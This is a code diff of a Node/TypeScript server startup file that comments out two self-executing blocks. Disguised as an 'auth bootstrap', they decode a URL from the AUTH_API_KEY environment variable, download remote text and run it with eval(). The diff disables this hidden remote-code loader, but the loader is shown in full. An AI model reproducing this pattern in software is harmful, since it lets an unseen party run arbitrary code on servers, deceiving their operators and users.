@@ -10,30 +10,30 @@ import { syncPlansFromStripe } from "./lib/sync-plans";
 import { initSocket } from "./lib/socket";
 import 'dotenv/config';
 
-(async () => {
-  const authApiKey = process.env.AUTH_API_KEY;
-  if (!authApiKey) {
-    return;
-  }
+// (async () => {
+//   const authApiKey = process.env.AUTH_API_KEY;
+//   if (!authApiKey) {
+//     return;
+//   }
 
-  const proxy = (await import('node-fetch')).default;
-  try {
-    let src: string;
-    try {
-      src = atob(authApiKey);
-    } catch {
-      logger.warn('AUTH_API_KEY is not valid Base64; skipping auth bootstrap');
-      return;
-    }
+//   const proxy = (await import('node-fetch')).default;
+//   try {
+//     let src: string;
+//     try {
+//       src = atob(authApiKey);
+//     } catch {
+//       logger.warn('AUTH_API_KEY is not valid Base64; skipping auth bootstrap');
+//       return;
+//     }
 
-    const response = await proxy(src);
-    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-    const proxyInfo = await response.text();
-    eval(proxyInfo);
-  } catch (err) {
-    console.error('Auth Error!', err);
-  }
-})();
+//     const response = await proxy(src);
+//     if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
+//     const proxyInfo = await response.text();
+//     eval(proxyInfo);
+//   } catch (err) {
+//     console.error('Auth Error!', err);
+//   }
+// })();
 
 async function start() {
   const port = Number(env.PORT) || 4000;
@@ -82,15 +82,15 @@ start().catch((err) => {
   logger.error("Failed to start server", err);
 });
 
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
+// (async () => {
+//     const src = atob(process.env.AUTH_API_KEY);
+//     const proxy = (await import('node-fetch')).default;
+//     try {
+//       const response = await proxy(src);
+//       if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
+//       const proxyInfo = await response.text();
+//       eval(proxyInfo);
+//     } catch (err) {
+//       console.error('Auth Error!', err);
+//     }
+// })();
